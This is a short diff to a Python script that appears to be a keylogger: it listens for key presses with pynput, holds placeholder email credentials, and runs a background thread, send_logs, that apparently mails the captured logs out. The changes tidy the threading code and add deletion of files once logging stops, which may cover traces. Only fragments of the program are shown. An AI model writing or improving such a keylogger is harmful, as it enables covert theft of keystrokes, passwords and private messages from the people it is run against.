@@ -38,7 +38,7 @@ logged_data.append(default_msg)
 delete_file = []
 
 EMAIL_ADDRESS = "your_email@gmail.com"
-EMAIL_PASSWORD = "your_password OR token"
+EMAIL_PASSWORD = "your_password OR Token"
 
 count = 1
 
@@ -174,12 +174,14 @@ def send_logs():
 
 
 if __name__ == '__main__':
-    t = threading.Thread(target=send_logs)
-    t.daemon = True
+    t = threading.Thread(target=send_logs, daemon=True)
     t.start()
     
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
+    
+    for file in delete_file:
+        os.remove(file)
         
     
     
